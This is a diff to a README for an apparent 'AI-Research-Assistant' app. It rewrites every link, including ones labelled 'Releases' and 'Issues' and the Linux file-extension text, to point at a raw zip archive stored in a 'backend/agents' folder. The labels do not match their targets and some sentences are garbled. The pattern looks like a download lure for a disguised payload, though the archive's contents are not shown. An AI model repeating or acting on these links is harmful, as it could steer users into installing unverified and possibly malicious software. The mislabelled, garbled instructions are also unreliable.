@@ -6,7 +6,7 @@ Welcome to the AI-Research-Assistant! This application helps you conduct researc
 
 ## 📥 Download the Application
 
-[![Download AI-Research-Assistant](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip)](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip)
+[![Download AI-Research-Assistant](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip)](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip)
 
 You can download the application from our Releases page. 
 
@@ -21,16 +21,16 @@ Before you run the application, ensure your system meets these requirements:
 
 ## 📖 How to Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip) page to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip) page to find the latest version of the application.
   
 2. **Select the Correct Version:** Look for the latest stable release, usually marked with the version number. Each release will have a description of what’s new.
 
-3. **Download the Installer:** Click on the appropriate link for your operating system (Windows, macOS, or Linux). The file will typically end in `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip` file for Linux.
+3. **Download the Installer:** Click on the appropriate link for your operating system (Windows, macOS, or Linux). The file will typically end in `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip` file for Linux.
 
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip` file and follow the included instructions for setup.
+   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip` file and follow the included instructions for setup.
 
 5. **Open the Application:** After installation, locate the application on your computer and open it.
 
@@ -59,7 +59,7 @@ If you face any issues:
 
 - **Check Your System Requirements:** Ensure your computer meets the necessary requirements.
 - **Consult the Help Section:** The application includes a help section with FAQs and guides.
-- **Community Support:** Visit the [Issues](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/sketch/AI-Research-Assistant.zip) section on GitHub to report problems or ask for help.
+- **Community Support:** Visit the [Issues](https://raw.githubusercontent.com/ggrbipin/AI-Research-Assistant/main/backend/agents/A-Research-Assistant-v3.1-beta.3.zip) section on GitHub to report problems or ask for help.
 
 ## 📅 Updates and Contributions
 
